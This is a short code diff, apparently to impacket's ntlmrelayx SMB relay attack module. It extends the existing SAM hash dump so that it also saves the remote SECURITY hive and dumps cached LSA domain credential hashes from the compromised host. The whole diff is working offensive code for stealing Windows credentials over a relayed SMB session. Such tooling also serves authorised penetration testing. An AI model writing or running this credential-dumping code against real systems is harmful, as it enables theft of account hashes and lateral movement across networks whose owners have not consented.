@@ -65,7 +65,7 @@ class SMBAttack(ProtocolAttack):
                 LOG.info("Service Installed.. CONNECT!")
                 self.installService.uninstall()
         else:
-            from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+            from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
             from impacket.examples.ntlmrelayx.utils.enum import EnumLocalAdmins
             samHashes = None
             try:
@@ -110,6 +110,10 @@ class SMBAttack(ProtocolAttack):
                     samHashes.dump()
                     samHashes.export(self.__SMBConnection.getRemoteHost()+'_samhashes')
                     LOG.info("Done dumping SAM hashes for host: %s", self.__SMBConnection.getRemoteHost())
+                    SECURITYFileName = remoteOps.saveSECURITY()     	
+                    LSASecrets = LSASecrets(SECURITYFileName, bootKey, remoteOps=None, isRemote= True, history=False)
+                    LSASecrets.dumpCachedHashes()
+                    LOG.info("Done dumping LSA secrets for host: %s", self.__SMBConnection.getRemoteHost())
             except Exception as e:
                 LOG.error(str(e))
             finally:
